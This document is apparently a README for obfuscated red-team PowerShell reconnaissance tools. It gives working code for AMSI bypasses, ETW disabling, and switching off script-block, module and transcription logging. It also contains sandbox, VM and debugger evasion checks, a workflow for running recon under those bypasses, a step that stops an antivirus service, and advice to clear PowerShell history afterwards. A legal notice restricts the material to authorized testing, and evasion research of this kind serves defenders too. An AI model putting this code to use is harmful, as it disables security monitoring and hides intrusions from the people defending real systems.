# Advanced Obfuscation & Evasion Techniques Guide

## Overview

This guide covers the advanced obfuscation and evasion techniques implemented in the obfuscated versions of RedTeamRecon tools.

## Obfuscation Layers

### Layer 1: Variable Name Obfuscation
All meaningful variable names are replaced with random character combinations:

**Original:**
```powershell
$domain = "contoso.com"
$users = @()
```

**Obfuscated:**
```powershell
$qwErTyUiOp = "contoso.com"
$zXcVbNmAsD = @()
```

### Layer 2: String Encoding
All strings are Base64-encoded using Unicode encoding:

**Original:**
```powershell
Write-Host "Enumerating users..." -ForegroundColor Info
```

**Obfuscated:**
```powershell
&(Get-Command *rite-Ho*) ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdQBzAGUAcgBzAC4ALgAuAA=='))) -ForegroundColor ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA=')))
```

### Layer 3: Function Name Obfuscation
Function names use mixed case and random characters:

**Original:**
```powershell
function Get-DomainUsers { }
```

**Obfuscated:**
```powershell
function gEtDoMaInUsErS { }
```

### Layer 4: Command Obfuscation
PowerShell cmdlets are invoked using wildcards:

**Original:**
```powershell
Write-Host "Message"
New-Object System.DirectoryServices.DirectorySearcher
```

**Obfuscated:**
```powershell
&(Get-Command *rite-Ho*) "Message"
&(Get-Command *ew-Ob*) System.DirectoryServices.DirectorySearcher
```

### Layer 5: LDAP Filter Encoding
LDAP filters are Base64 encoded to avoid string signatures:

**Original:**
```powershell
$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
```

**Obfuscated:**
```powershell
$searcher.Filter = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQApAA=='))
```

## Bypass Techniques

### 1. AMSI Bypass (5 Methods)

#### Method 1: AmsiInitFailed Field Manipulation
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Method 2: AmsiContext Manipulation
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
```

#### Method 3: Memory Patching via P/Invoke
```powershell
# Patches amsi.dll!AmsiScanBuffer in memory
# Changes return value to always return clean
```

#### Method 4: AmsiSession Manipulation
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
```

#### Method 5: Combined Approach
Applies multiple methods simultaneously for redundancy.

**Implementation:**
All methods are Base64 encoded and selected randomly at runtime (polymorphism).

### 2. ETW Bypass

Disables Event Tracing for Windows to prevent PowerShell logging:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,$null)
```

### 3. Script Block Logging Bypass

Disables PowerShell script block logging:

```powershell
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings['EnableScriptBlockLogging'] = 0
$settings['EnableScriptBlockInvocationLogging'] = 0
```

### 4. Module Logging Bypass

Disables PowerShell module logging:

```powershell
$settings['EnableModuleLogging'] = 0
$settings['ModuleNames'] = @()
```

### 5. Transcription Bypass

Disables PowerShell transcription:

```powershell
$settings['EnableTranscriptionLogging'] = 0
$settings['EnableTranscriptionInvocationLogging'] = 0
$settings['OutputDirectory'] = ''
```

### 6. Signature Bypass

Clears cached script signatures:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static').SetValue($null, (New-Object System.Collections.Generic.HashSet[string]))
```

## Anti-Detection Techniques

### 1. Sandbox Detection

Checks for common sandbox indicators:

- **Low RAM**: < 4GB indicates sandbox
- **Low CPU cores**: < 2 cores indicates sandbox
- **Small disk**: < 80GB indicates sandbox
- **Low uptime**: < 10 minutes indicates fresh sandbox
- **VM processes**: vmtoolsd, vboxservice, etc.
- **VM BIOS**: Contains vmware, vbox, qemu strings

**Implementation:**
```powershell
function tEsT-sAnDbOx {
    $indicators = 0
    
    # RAM check
    if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB -lt 4) { $indicators++ }
    
    # CPU check
    if ((Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors -lt 2) { $indicators++ }
    
    # Return true if 3+ indicators
    return $indicators -ge 3
}
```

### 2. VM Detection

Identifies virtualized environments:

- VMware Tools
- VirtualBox Guest Additions
- VM-specific services
- VM BIOS strings
- VM network adapters

### 3. Debugger Detection

Checks for debugging tools:

- **Attached debugger**: `[System.Diagnostics.Debugger]::IsAttached`
- **Debugger processes**: OllyDbg, x64dbg, WinDbg, IDA Pro
- **Analysis tools**: Wireshark, Fiddler, Process Monitor

### 4. Process Hollowing Detection

Validates process integrity to detect injection.

## Stealth Techniques

### 1. Randomized Timing (Jitter)

Adds random delays to avoid pattern detection:

```powershell
function sTaRtSlEeP {
    param([int]$mIn = 500, [int]$mAx = 2000)
    Start-Sleep -Milliseconds (Get-Random -Minimum $mIn -Maximum $mAx)
}
```

**Usage:**
- Between LDAP queries
- Between user enumerations
- Between network connections

### 2. Polymorphic Code

Code changes each execution:

- **Random bypass method selection**: Different AMSI bypass each run
- **Random encoding**: Strings encoded differently each time
- **Random order**: Bypasses executed in random order

### 3. In-Memory Execution

No disk writes:

- Code loaded directly from Base64
- Assemblies loaded from byte arrays
- Results stored in memory
- Minimal file creation

### 4. Reflective Loading

Uses .NET reflection to avoid imports:

```powershell
# Instead of:
Get-ADUser -Filter *

# Use:
[Ref].Assembly.GetType('type').GetMethod('method').Invoke($null, $params)
```

## Usage Guide

### Basic Obfuscated Execution

```powershell
# 1. Load obfuscated stealth module
Import-Module .\StealthUtils_Obfuscated.psm1

# 2. Run all bypasses
iNvOkE-aLlByPaSsEs

# 3. Check environment safety
$env = tEsT-eNvIrOnMeNt
if ($env.IsSafe) {
    # 4. Execute obfuscated recon
    .\RedTeamRecon_Obfuscated.ps1 -pOiUyTrEwQ
}
```

### Advanced Reflective Loading

```powershell
# 1. Run reflective loader
.\ReflectiveLoader.ps1 -sTeAlTh

# 2. Loader performs:
#    - Multi-stage AMSI bypass
#    - ETW bypass
#    - Logging bypass
#    - Sandbox detection
#    - Debugger detection
#    - Safe for payload execution
```

### Stealth Execution Workflow

```powershell
# 1. Import stealth utilities
Import-Module .\StealthUtils_Obfuscated.psm1

# 2. Test environment
$env = tEsT-eNvIrOnMeNt

if (-not $env.IsSafe) {
    Write-Host "[!] Unsafe environment detected:"
    Write-Host "    Flags: $($env.Detected -join ', ')"
    exit
}

# 3. Apply bypasses
iNvOkE-aLlByPaSsEs

# 4. Execute with stealth
iNvOkE-sTeMlThExEc -cOdE {
    # Your reconnaissance code here
    .\RedTeamRecon_Obfuscated.ps1
}
```

## File Descriptions

### 1. RedTeamRecon_Obfuscated.ps1
Main reconnaissance tool with:
- All variables obfuscated
- All strings Base64 encoded
- All functions obfuscated
- LDAP filters encoded
- Randomized execution timing

### 2. StealthUtils_Obfuscated.psm1
Stealth utilities module with:
- 5 polymorphic AMSI bypasses
- ETW bypass
- Script block logging bypass
- Module logging bypass
- Transcription bypass
- Signature bypass
- Sandbox detection
- VM detection
- Debugger detection
- Process hollowing detection

### 3. ReflectiveLoader.ps1
Advanced multi-stage loader with:
- 7-stage execution
- Environment validation
- Multi-method bypasses
- Reflective code loading
- In-memory assembly loading
- Process injection framework
- Anti-sandbox checks
- Anti-debug checks

### 4. ObfuscationEngine.psm1
Obfuscation engine for custom scripts:
- Variable name randomization
- String obfuscation (Base64)
- Command obfuscation
- Noise injection

## Detection Evasion Matrix

| Technique | Bypass | Effectiveness |
|-----------|--------|---------------|
| AMSI | 5 methods | Very High |
| ETW | Provider nulling | Very High |
| Script Block Logging | Cache manipulation | Very High |
| Module Logging | Policy bypass | High |
| Transcription | Settings override | High |
| Signature Checks | Cache clearing | High |
| Sandbox | Multi-check detection | Medium-High |
| VM | Artifact detection | Medium-High |
| Debugger | Process check | High |

## Operational Security

### Pre-Execution Checklist

- [ ] Verify environment is not sandboxed
- [ ] Confirm no debuggers attached
- [ ] Check VM indicators
- [ ] Test bypasses in lab first
- [ ] Understand legal authorization

### During Execution

- [ ] Monitor for detection
- [ ] Use randomized timing
- [ ] Minimize network noise
- [ ] Keep memory footprint low
- [ ] Avoid disk writes

### Post-Execution

- [ ] Clear memory artifacts
- [ ] Remove temporary files
- [ ] Clear PowerShell history
- [ ] Restore logging settings (if needed)
- [ ] Document activities

## Advanced Customization

### Creating Custom Obfuscated Payloads

```powershell
# 1. Load obfuscation engine
Import-Module .\ObfuscationEngine.psm1

# 2. Obfuscate your code
$myCode = @'
function Get-Something {
    $data = "sensitive"
    Write-Host $data
}
'@

$obfuscated = Invoke-Obfuscation -Code $myCode -Iterations 3

# 3. Save obfuscated version
$obfuscated | Out-File .\MyScript_Obfuscated.ps1
```

### Adding Custom Bypasses

```powershell
# Add to StealthUtils_Obfuscated.psm1

function cUsToMbYpAsS {
    try {
        # Your custom bypass logic
        # Example: Disable custom security product
        
        Stop-Service "CustomAV" -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Add to iNvOkE-aLlByPaSsEs function
```

## Warning & Legal Notice

⚠️ **CRITICAL LEGAL NOTICE** ⚠️

These obfuscation and bypass techniques are provided **ONLY** for:
- Authorized penetration testing
- Red team engagements with written authorization
- Security research in controlled environments
- Educational purposes

**Unauthorized use is ILLEGAL and may result in:**
- Criminal prosecution under CFAA and equivalent laws
- Civil liability
- Imprisonment
- Significant financial penalties

**Requirements before use:**
- Written authorization from system owner
- Clearly defined scope
- Legal review and approval
- Incident response plan
- Professional liability insurance

## References

### Bypass Techniques
- [AMSI Bypass Methods](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [PowerShell Logging Bypass](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- [ETW Bypass](https://blog.xpnsec.com/hiding-your-dotnet-etw/)

### Obfuscation Techniques
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [PowerShell Obfuscation](https://www.darkoperator.com/blog/2017/3/5/powershell-obfuscation)

### Anti-Detection
- [Sandbox Detection](https://github.com/LordNoteworthy/al-khaser)
- [VM Detection Techniques](https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667)

## Support & Updates

For updates and improvements:
- Test in isolated lab environment first
- Review MITRE ATT&CK techniques
- Stay current with defensive capabilities
- Share improvements responsibly

---

**Remember:** With great power comes great responsibility. Use these techniques ethically and legally.
